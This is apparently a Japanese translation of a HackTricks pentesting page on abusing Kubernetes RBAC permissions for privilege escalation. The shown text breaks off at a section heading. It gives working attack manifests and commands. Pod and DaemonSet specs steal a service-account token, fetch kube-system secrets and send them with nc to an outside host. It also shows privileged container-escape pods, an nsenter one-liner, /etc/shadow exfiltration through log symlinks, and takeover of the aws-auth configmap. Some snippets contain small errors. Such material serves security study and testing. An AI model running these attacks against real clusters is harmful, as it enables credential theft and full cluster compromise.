# KubernetesでのRoles/ClusterRolesの悪用

<details>

<summary><strong>HackTricksをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する

</details>

ここでは、いくつかの潜在的に危険なRolesとClusterRolesの設定を見つけることができます。\
`kubectl api-resources`を使用して、サポートされているすべてのリソースを取得できることを忘れないでください。

## **特権昇格**

Kubernetesでは、既に持っている権限とは異なる特権を持つクラスタ内の**別のプリンシパルにアクセスする**ことを指しています。特権昇格のためには、基本的に**4つの主要なテクニック**があります。

* Kubernetesクラスタ内または外部クラウドで、より高い特権を持つ他のユーザー/グループ/SAを**なりすます**ことができる
* Kubernetesクラスタ内または外部クラウドで、より高い特権を持つSAを**見つけたりアタッチしたりできる**ポッドを**作成/パッチ/実行**できる
* SAのトークンはシークレットとして保存されているため、**シークレットを読み取る**ことができる
* コンテナからノードに**エスケープ**することができ、ノードで実行されているコンテナのすべてのシークレット、ノードの資格情報、およびノードが実行されているクラウド内の権限（存在する場合）を盗むことができる
* ポッドで**ポートフォワードを実行**する能力も言及に値するテクニックであり、そのポッド内の興味深いリソースにアクセスできるかもしれない

### **任意のリソースまたは動詞へのアクセス（ワイルドカード）**

この特権は、**任意のリソースに任意の動詞でアクセス**する権限を提供します。特にこの特権が「ClusterRole」である場合、ユーザーは任意の名前空間のリソースにアクセスし、その権限でクラスタを所有することができます。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **任意のリソースへのアクセス**

ユーザーに**任意のリソースへのアクセス権限を与えることは非常に危険**です。しかし、これらのリソースへのアクセスを許可するための**どの動詞**が存在するのでしょうか？以下は、クラスタ全体に損害を与える可能性のある危険なRBAC権限のいくつかです：

* **resources: \["\*"] verbs: \["create"]** - この権限により、**ポッド**、ロールなどのクラスタ内の**任意のリソースを作成**することができます。攻撃者はこれを悪用して**特権のエスカレーション**を行う可能性があります。これに関する例は**「ポッドの作成」セクション**にあります。
* **resources: \["\*"] verbs: \["list"]** - 任意のリソースをリストする能力は、他のユーザーの秘密情報を**漏洩**させることができ、特権のエスカレーションを容易にする可能性があります。これに関する例は**「シークレットのリスト表示」セクション**にあります。
* **resources: \["\*"] verbs: \["get"]** - この権限は、他のサービスアカウントから**シークレットを取得**するために使用することができます。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Podの作成 - トークンの盗難

「kube-system」名前空間でPodを作成する権限を持つ攻撃者は、例えば暗号マイニングコンテナを作成することができます。さらに、特権のある権限を持つサービスアカウントが存在する場合、そのサービスを実行するPodを実行することで権限を乱用して特権をエスカレーションすることができます。

ここでは、すべてのシークレットをリストする権限を持つデフォルトの特権アカウントである_bootstrap-signer_があります。

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

攻撃者は特権のあるサービスを使用する悪意のあるPodを作成することができます。そして、サービストークンを乱用してシークレットを外部に持ち出すことができます。

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
前のイメージでは、_bootstrap-signerサービスが_ `serviceAccountname`_で使用されていることに注意してください。_

したがって、悪意のあるポッドを作成し、ポート6666でシークレットを取得することができます。

### **ポッドの作成とエスケープ**

次の定義では、コンテナが持つことができるすべての特権を与えます：

* **特権アクセス**（保護を無効にし、機能を設定する）
* **ネームスペースhostIPCとhostPidを無効化**し、特権をエスカレートするのに役立つ
* **ホストネットワーク**ネームスペースを無効化し、ノードのクラウド特権へのアクセスとネットワークへのより良いアクセスを提供します
* **コンテナ内のホストの/をマウントする**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

以下のコマンドでポッドを作成します：
```bash
kubectl --token $token create -f mount_root.yaml
```
[このツイート](https://twitter.com/mauilion/status/1129468485480751104)からのワンライナーといくつかの追加情報:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### ステルス

おそらく、より**ステルス**になりたいと思うでしょう。次のページでは、前のテンプレートで言及された特権の一部のみを有効にするようなポッドを作成した場合にアクセスできるものを見ることができます。

* **特権 + hostPID**
* **特権のみ**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_前述の特権付きポッドの設定を作成/悪用する例は_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _で見つけることができます_

### ポッドの作成 - クラウドへの移行

**ポッド**（オプションで**サービスアカウント**）を**作成**できる場合、**ポッドまたはサービスアカウントにクラウドロールを割り当て**てアクセスすることで、**クラウド環境で特権を取得**することができるかもしれません。さらに、**ホストネットワーク名前空間を持つポッドを作成**できる場合、**ノードインスタンスのIAMロールを盗む**ことができます。

詳細については、次を参照してください：

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **デプロイメント、デーモンセット、ステートフルセット、レプリケーションコントローラ、レプリカセット、ジョブ、クロンジョブの作成/パッチ**

デプロイメント、デーモンセット、ステートフルセット、レプリケーションコントローラ、レプリカセット、ジョブ、クロンジョブは、クラスタ内でさまざまなタスクを作成するための特権です。さらに、これらすべてを使用して**ポッドを開発し、ポッドを作成**することも可能です。したがって、前の例と同様に特権をエスカレートするためにそれらを**悪用**することができます。

次のように**デーモンセットを作成する権限**があると仮定し、次のYAMLファイルを作成します。このYAMLファイルは、「ポッドの作成」セクションで説明した手順と同じものを実行するように設定されています。
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
6行目には「spec」というオブジェクトと、10行目には「**template**」という子オブジェクトがあります。これらのオブジェクトは、私たちが達成したいタスクの設定を保持しています。また、15行目の「**serviceAccountName**」と18行目の「**containers**」オブジェクトにも注目してください。これが、私たちの悪意のあるコンテナを作成する部分です。

Kubernetes APIのドキュメントによれば、「**PodTemplateSpec**」エンドポイントにはコンテナを作成するオプションがあります。そして、次のように示されています: **deployment、daemonsets、statefulsets、replicationcontrollers、replicasets、jobs、cronjobsはすべてポッドを作成するために使用できます**:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**したがって、タスクの作成または更新の権限も、クラスタ内での特権エスカレーションに悪用される可能性があります。**

### **Pods Exec**

**`pods/exec`**は、kubernetesで**ポッド内のシェルでコマンドを実行する**ために使用されるリソースです。この特権は、**コンテナにアクセスしてコマンドを実行したい管理者**向けに設計されています。これは、コンテナ用のSSHセッションを作成するのと同じです。

この特権を持っている場合、実際には**すべてのポッドを制御する能力**を得ることができます。そのためには、次のコマンドを使用する必要があります:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
注意してください。任意のポッドにアクセスできるため、**ポッド作成の悪用**と同様に、他のポッドのトークンを悪用して特権をエスカレーションすることができます。

### ポートフォワード

この権限は、**指定されたポッドの1つのポートをローカルの1つのポートに転送する**ことを許可します。これは、ポッド内で実行されているアプリケーションのデバッグを容易にするためのものですが、攻撃者はそれを悪用して、ポッド内の興味深い（例：DB）または脆弱なアプリケーション（ウェブ？）にアクセスすることができます。
```
kubectl port-forward pod/mypod 5000:5000
```
### **ホストの書き込み可能な/var/log/の脱出**

[**この研究**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)に示されているように、ホストの`/var/log/`ディレクトリがマウントされたポッドにアクセスまたは作成することができれば、コンテナから脱出することができます。\
これは基本的に、**Kube-APIがコンテナのログを取得**しようとするとき（`kubectl logs <pod>`を使用）、**Kubelet**サービスの`/logs/`エンドポイントを使用してポッドの`0.log`ファイルをリクエストするためです。\
Kubeletサービスは、基本的にコンテナの`/var/log`ファイルシステムを公開している`/logs/`エンドポイントを公開しています。

したがって、コンテナの`/var/log/`フォルダに**書き込みアクセス権限を持つ攻撃者**は、次の2つの方法でこの動作を悪用することができます：

* 例えば、`0.log`ファイルを`/etc/shadow`を指す**シンボリックリンク**に変更します。その後、次のコマンドを使用してホストのshadowファイルを外部に持ち出すことができます：
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* 攻撃者が**`nodes/log`を読む権限を持つ**任意のプリンシパルを制御している場合、彼は単に`/host-mounted/var/log/sym`に`symlink`を作成することができます。そして、`https://<gateway>:10250/logs/sym/`にアクセスすると、ホストのルートファイルシステムがリストされます（シンボリックリンクを変更することでファイルにアクセスできます）。
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**実験室と自動化されたエクスプロイトは** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **にあります**

#### readOnly保護のバイパス <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

もし運が良く、高特権の `CAP_SYS_ADMIN` 機能が利用可能な場合、フォルダを読み書き可能に再マウントすることができます。
```bash
mount -o rw,remount /hostlogs/
```
#### hostPathのreadOnly保護をバイパスする <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**この研究**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)に記載されているように、保護をバイパスすることが可能です。
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
次に、以前のエスケープと同様のエスケープを防ぐために、hostPathマウントを使用せずに、PersistentVolumeとPersistentVolumeClaimを使用して、コンテナ内のホストのフォルダを書き込み可能なアクセスでマウントする方法があります。
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **特権アカウントのなりすまし**

[**ユーザーなりすまし**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)の特権を持つ攻撃者は、特権アカウントになりすますことができます。

この例では、サービスアカウント _**sa-imper**_ が、グループとユーザーのなりすましを許可するルールを持つ ClusterRole にバインディングされています。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

`--as=null --as-group=system:master` 属性を使用して、**すべてのシークレットをリストすることが可能です**：

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**同じ操作をAPI RESTエンドポイントを介して実行することも可能です：**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **シークレットの一覧表示**

**シークレットの一覧表示権限**は、クラスター内で持つと非常に強力な機能です。シークレットの一覧表示権限を持つユーザーは、**管理者キーを含むクラスター内のすべてのシークレットを表示する可能性があります**。シークレットキーは、ベース64でエンコードされたJWTトークンです。

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

クラスター内で\_list secrets\_にアクセスできる攻撃者は、以下の_curl_コマンドを使用して「kube-system」名前空間のすべてのシークレットを取得することができます。
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **シークレットの読み取り - トークンIDのブルートフォース攻撃**

シークレットを読み取る権限を持つトークンを見つけた攻撃者は、シークレットの完全な名前を知らない限り、この権限を使用することはできません。この権限は、上記で説明した_**シークレットの一覧表示**_権限とは異なります。

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

攻撃者はシークレットの名前を知りませんが、登録できるデフォルトのサービスアカウントがあります。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

各サービスアカウントには、静的（変更されない）プレフィックスと末尾にランダムな5文字の文字列トークンが関連付けられたシークレットがあります。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

ランダムなトークンの構造は、英数字（小文字と数字）の文字から構成される5文字の文字列です。**ただし、すべての文字と数字が含まれているわけではありません。**

[ソースコード](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)を見ると、トークンは27文字の文字「bcdfghjklmnpqrstvwxz2456789」のみから生成されていることがわかります。

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

これにより、トークンの可能性は275 = 14,348,907通りあります。

攻撃者は、数時間でトークンIDを推測するためにブルートフォース攻撃を実行することができます。デフォルトの機密サービスアカウントからシークレットを取得することに成功すれば、特権をエスカレーションすることができます。

### 証明書署名リクエスト

リソース`certificatesigningrequests`（または少なくとも`certificatesigningrequests/nodeClient`）に**`create`**の動詞がある場合、**新しいノードの**新しいCeSRを**作成**することができます。

[ドキュメントによると、このリクエストを自動承認することが可能です](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)ので、その場合は**追加の権限は必要ありません**。そうでない場合は、リクエストを承認することができる必要があります。つまり、`certificatesigningrequests/approval`の更新と`signers`の`approve`にリソース名`<signerNameDomain>/<signerNamePath>`または`<signerNameDomain>/*`を指定する必要があります。

必要なすべての権限を持つ**ロールの例**は次のとおりです：
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
So, with the new node CSR approved, you can **abuse** the special permissions of nodes to **steal secrets** and **escalate privileges**.

In [**this post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) and [**this one**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), the GKE K8s TLS Bootstrap configuration is configured with **automatic signing** and it's abused to generate credentials of a new K8s Node and then abuse those to escalate privileges by stealing secrets.\
If you **have the mentioned privileges, you could do the same thing**. Note that the first example bypasses the error preventing a new node from accessing secrets inside containers because a **node can only access the secrets of containers mounted on it**.

The way to bypass this is just to **create node credentials for the node name where the container with the interesting secrets is mounted** (but just check how to do it in the first post):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKS（AWS内）クラスターのkube-system名前空間で**`configmaps`**を変更できる主体は、**aws-auth** configmapを上書きすることでクラスター管理者権限を取得できます。
必要な動詞は**`update`**と**`patch`**です。configmapが作成されていない場合は**`create`**が必要です。

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**`aws-auth`**を使用して、**他のアカウントのユーザーにアクセス権限を与える**ことができます。

ただし、`aws --profile other_account eks update-kubeconfig --name <cluster-name>`は**異なるアカウントからは機能しません**。しかし、実際には、`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing`は、名前だけでなくクラスタのARNを使用すると機能します。\
`kubectl`を動作させるためには、**被害者のkubeconfigを設定**し、aws exec argsに`--profile other_account_role`を追加するだけで、kubectlは他のアカウントのプロファイルを使用してトークンを取得し、AWSに接続します。
{% endhint %}

### GKEでのエスカレーション

GCPの主体にK8sの権限を割り当てる方法は**2つ**あります。いずれの場合でも、主体はクラスタにアクセスするための資格情報を収集するために**`container.clusters.get`**の権限も必要です。そうでない場合は、独自のkubectl構成ファイルを生成する必要があります（次のリンクを参照してください）。

{% hint style="warning" %}
K8s APIエンドポイントに接続する際には、GCPの認証トークンが送信されます。その後、GCPはK8s APIエンドポイントを介して、主体（メールアドレスによる）がクラスタ内でアクセス権を持っているかどうかを最初にチェックし、次にGCP IAM経由でアクセス権を持っているかどうかをチェックします。\
これらのいずれかが**true**であれば、応答が返されます。そうでない場合は、GCP IAM経由で権限を付与するようにというエラーが表示されます。
{% endhint %}

最初の方法は**GCP IAM**を使用する方法で、K8sの権限には**対応するGCP IAMの権限**があり、主体がそれを持っていれば使用することができます。

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

2番目の方法は、クラスタ内でK8sの権限を識別するために、ユーザーの**メールアドレス**（GCPサービスアカウントも含む）を使用することです。

### serviceaccountsトークンの作成

`serviceaccounts/token`を**作成できる主体**は、管理者と同等のSAのためのトークンを発行することができます（[ここ](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)の情報）。

### ephemeralcontainers

**`pods/ephemeralcontainers`**を**`update`**または**`patch`**できる主体は、他のポッドで**コードを実行**し、特権のあるsecurityContextを持つephemeralコンテナを追加することで、**ノードから脱出**する可能性があります。

### ValidatingWebhookConfigurationsまたはMutatingWebhookConfigurations

`validatingwebhookconfigurations`または`mutatingwebhookconfigurations`のいずれかに対して`create`、`update`、または`patch`のいずれかの動詞を持つ主体は、特権をエスカレートするためにそのようなwebhookconfigurationsの1つを作成できる可能性があります。

[`mutatingwebhookconfigurations`の例については、このセクションを参照してください](./#malicious-admission-controller)。

### エスカレーション

次のセクションで読むことができるように、[**組み込みの特権エスカレーション防止**](./#built-in-privileged-escalation-prevention)では、主体は自身に新しい権限を持たない限り、ロールやクラスタロールを更新または作成することはできません。ただし、**`roles`**または**`clusterroles`**に対する**`escalate`**の動詞を持っている場合は除きます。\
その場合、彼は自身の権限よりも優れた権限を持つ新しいロールやクラスタロールを更新/作成することができます。

### ノードプロキシ

**`nodes/proxy`**のサブリソースにアクセス権を持つ主体は、Kubelet APIを介してポッド上でコードを実行できます（[ここ](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)によると）。Kubeletの認証に関する詳細情報は、次のページを参照してください。

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**ここでKubelet APIに認証された状態でRCEを取得する例**](../pentesting-kubernetes-services.md#kubelet-rce)をご覧いただけます。

### ポッドの削除 + スケジュール不可なノード

**ポッドを削除**（`pods`リソースに対する`delete`動詞）、**ポッドを追い出す**（`pods/eviction`リソースに対する`create`動詞）、または**ポッドのステータスを変更**（`pods/status`へのアクセス）でき、**他のノードをスケジュール不可にする**（`nodes/status`へのアクセス）か**ノードを削除**（`nodes`リソースに対する`delete`動詞）し、ポッドを制御できる主体は、他のノードからポッドを**奪い取る**ことができます。そのようなポッドは**侵害されたノード**で実行され、攻撃者はそれらのポッドからトークンを**盗む**ことができます。

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### サービスのステータス（CVE-2020-8554）

**`services/status`** を**変更**できる主体は、**修正されていないCVE-2020-8554**を悪用し、クラスタに対して**MiTM攻撃を実行**するために`status.loadBalancer.ingress.ip`フィールドを設定することができます。CVE-2020-8554のほとんどの緩和策は、ExternalIPサービスのみを防止します（[**こちら**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)を参照）。

### ノードとポッドのステータス

**`nodes/status`** または **`pods/status`** の**`update`**または**`patch`**権限を持つ主体は、スケジューリング制約に影響を与えるためにラベルを変更することができます。

## 組み込み特権昇格防止

危険な権限が存在するかもしれませんが、Kubernetesは特権昇格の可能性がある他のタイプの権限を防止するために良い仕事をしています。

Kubernetesには、[組み込みのメカニズム](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)があります。

> RBAC APIは、ロールまたはロールバインディングを編集することによる特権の昇格を防止します。これはAPIレベルで強制されるため、RBAC認可プラグインが使用されていない場合でも適用されます。
>
> ユーザーは、ロールに含まれるすべての権限を既に持っている場合にのみ、ロールを作成/更新できます。ロールと同じスコープ（ClusterRoleの場合はクラスタ全体、Roleの場合は同じ名前空間またはクラスタ全体）で。

{% hint style="warning" %}
前のルールには例外があります。主体が**`roles`**または**`clusterroles`**に対して**`escalate`**動詞を持っている場合、彼は自身に権限がなくてもロールとクラスタロールの特権を増やすことができます。
{% endhint %}

このような防止策の例を見てみましょう。

サービスアカウント名が_sa7_で、RoleBinding _edit-role-rolebinding_に存在します。このRoleBindingオブジェクトには、_edit-role_という名前のロールがあり、_default_名前空間の**すべてのロールに対して完全な権限ルール**を持っています。理論的には、サービスアカウントは_default_名前空間の**任意のロール**を**編集**できることを意味します。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

また、_list-pods_という既存のロールも存在します。このロールを持つユーザーは_default_名前空間のすべてのポッドをリストすることができます。ユーザー_sa7_は任意のロールを編集する権限を持つはずなので、ロールのリソースに「secrets」リソースを追加しようとした場合に何が起こるか見てみましょう。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

そうすると、「forbidden: attempt to grant extra privileges」というエラーが表示されます（図31）。なぜなら、_sa7_ユーザーは任意のリソースのロールを更新する権限を持っているため、自身に権限があるリソースのみロールを更新できるからです。

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **RoleBindings/ClusterRoleBindingsの取得とパッチ**

{% hint style="danger" %}
**このテクニックは以前は機能していたようですが、私のテストによると、前のセクションで説明した理由と同じく、もはや機能していません。自分自身または別のサービスアカウントに特権を与えるために、既にそれを持っていない場合、ロールバインディングを作成/変更することはできません。**
{% endhint %}

Rolebindingsを作成する特権は、ユーザーがサービスアカウントにロールをバインドすることを可能にします。この特権は、**コンプロミスされたサービスアカウントに管理者特権をバインドする**可能性があるため、特権昇格につながる可能性があります。

次のClusterRoleは、特別な動詞_bind_を使用して、ユーザーが_admin_ ClusterRole（デフォルトの高特権ロール）を持つRoleBindingを作成し、このadmin ClusterRoleに自身を含む任意のユーザーを追加することを許可します。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

その後、**`malicious-RoleBinging.json`**を作成し、**管理者ロールを他のコンプロミスされたサービスアカウントにバインド**します。
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
このJSONファイルの目的は、管理者の「ClusterRole」（11行目）を侵害されたサービスアカウント（16行目）にバインドすることです。

さて、次に、以下のCURLコマンドを使用してJSONをAPIにPOSTリクエストとして送信するだけです。
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
**adminロールが「compromised-svc」サービスアカウントにバインドされた後、私たちは侵害されたサービスアカウントトークンを使用してシークレットをリストすることができます。次のCURLコマンドを使用します。**

```bash
curl -H "Authorization: Bearer <compromised_token>" https://api.example.com/secrets
```

このコマンドは、`compromised_token`という侵害されたトークンを使用して、`https://api.example.com/secrets`からシークレットをリストします。
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## その他の攻撃

### サイドカープロキシアプリ
